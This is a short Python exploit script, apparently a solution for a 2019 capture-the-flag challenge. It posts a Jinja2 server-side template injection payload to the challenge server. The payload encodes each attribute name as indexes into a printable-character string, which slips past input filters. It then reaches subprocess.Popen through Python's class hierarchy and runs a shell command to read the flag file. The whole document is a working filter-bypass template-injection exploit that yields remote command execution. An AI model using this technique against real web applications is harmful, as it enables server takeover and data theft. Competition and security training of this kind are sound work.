import requests
import string

TARGET = 'https://verysafeninja.ecsc19.hack.cert.pl/'
TITLE = string.printable


def send_exploit(exploit):
    files = {'content': bytes(exploit, 'utf-8')}
    data = {'title': TITLE}
    resp = requests.post(TARGET, data=data, files=files)
    print(resp.text)


def e(s):
    encrypted = ''
    for c in s:
        try:
            encrypted += 'title[' + str(TITLE.index(c)) + ']+'
        except Exception:
            print("Couldn't find " + c)
    return encrypted[:-1]


def main():
    exploit = "{{% set zm1,z0,z1,z373=-1,0,1,373 %}}{{{{ title[{0}][{1}][z1][{2}]()[z373]([{3}], shell=True, stdout=zm1)[{4}]()[z0][{5}]() }}}}".format(
        e('__class__'), # 0
        e('__mro__'), # 1
        e('__subclasses__'), # 2
        e('cat flag.txt;'), #3
        e('communicate'), #4
        e('strip') #5
    )
    send_exploit(exploit)


if __name__ == '__main__':
    main()

